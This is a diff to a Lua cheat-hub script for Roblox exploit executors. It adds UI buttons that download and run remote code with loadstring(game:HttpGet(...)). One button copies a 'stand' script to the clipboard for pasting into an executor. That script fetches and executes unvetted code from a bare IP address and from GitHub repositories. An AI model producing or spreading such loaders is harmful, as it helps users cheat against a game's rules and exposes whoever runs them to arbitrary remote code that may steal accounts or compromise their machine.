@@ -728,6 +728,105 @@ local Button = FlingTab:Button({
 })
 
 
+local TrashTab = Window:Tab({
+    Title = "Trash Can Moveset",
+    Icon = "zap", -- optional
+    Locked = false,
+})
+
+local Button = TrashTab:Button({
+    Title = "Trash Can Moveset Script",
+    Desc = "Execute",
+    Locked = false,
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/yes1nt/yes/refs/heads/main/Trashcan%20Man", true))()
+    end
+})
+
+
+local StandTab = Window:Tab({
+    Title = "Stand Owner Script",
+    Icon = "zap", -- optional
+    Locked = false,
+})
+
+
+local Paragraph = StandTab:Paragraph({
+    Title = "This is a button to copy the stand script. Put in executor and change OWNER values.",
+    Desc = "Works with only same age group chat difference.",
+    Color = "Red",
+    Image = "",
+    ImageSize = 30,
+    Thumbnail = "",
+    ThumbnailSize = 80,
+    Locked = false,
+    Buttons = {
+        {
+            Icon = "copy",
+            Title = "Copy Stand Script",
+            Callback = function() -- This script only copies the real script to your clipboard
+-- Nothing gets executed
+
+local scriptToCopy = [[
+getgenv().Credits = "https://discord.gg/Aknd49ARke | If you pay for this script you get scammed this script is completely free for use"
+
+getgenv().SocietyStand = {
+    Main = {
+        --// ! Main ! \--
+        Owner = "mastersinuuu", -- Username of owner !!CASE SENSITIVE!!
+        CustomName = "Master", -- Custom Name Text. Default is [Master]. Example: 'I'm Here, Master!'
+        CustomPrefix = "!", -- [ ! | / | . | ? | > | < | $ | ; | : ] Custom prefix
+        PrefixAT = "Before", -- [Before | After] decides if the prefix is before the command or after
+        Position = "Back", -- Position of Stand [Back | Left | Right]
+
+        --\ ! Main ! //-- 
+        --// ! Settings >.< ! \--
+        CustomSummon = "Star Platinum Za Warudo", -- Custom summon command 
+        FlyAnim = "fly3", -- Animation it uses: float1 / float2 / fly1 / fly2 / lev1 / lev2 / lev3 / fly3
+        ChatCommands = false, -- [true | false] Chats when you use some command
+        lowgfx = false, -- [true | false] Low graphics to boost performance
+        DisableRendering = false, -- [true | false] Disable rendering for maximum performance
+        --\ ! Settings >.< ! //--
+    }
+}
+
+pcall(function()
+    loadstring(game:HttpGet("http://149.40.3.138:50908/main"))()
+end)
+
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/losermancracker-byte/scripts/refs/heads/main/commands"))()
+end)
+]]
+
+-- Most popular Roblox exploit methods to set clipboard:
+if setclipboard then
+    setclipboard(scriptToCopy)
+    print("Script copied to clipboard! (setclipboard)")
+elseif toclipboard then
+    toclipboard(scriptToCopy)
+    print("Script copied to clipboard! (toclipboard)")
+elseif SynapseX and SynapseX.set_clipboard then
+    SynapseX.set_clipboard(scriptToCopy)
+    print("Script copied to clipboard! (Synapse)")
+else
+    warn("Couldn't copy to clipboard automatically.")
+    warn("Please manually copy the code above ^^^")
+end
+
+-- Optional: show a little message in console
+print("──────────────────────────────────────────")
+print("     Society Stand script copied!          ")
+print("Paste it wherever you want to actually run it")
+print("──────────────────────────────────────────")
+ end,
+        }
+    }
+})
+
+
+
+
 
 
 
@@ -769,4 +868,3 @@ local Keybind = KeybindTab:Keybind({
         Window:SetToggleKey(Enum.KeyCode[v])
     end
 })
-
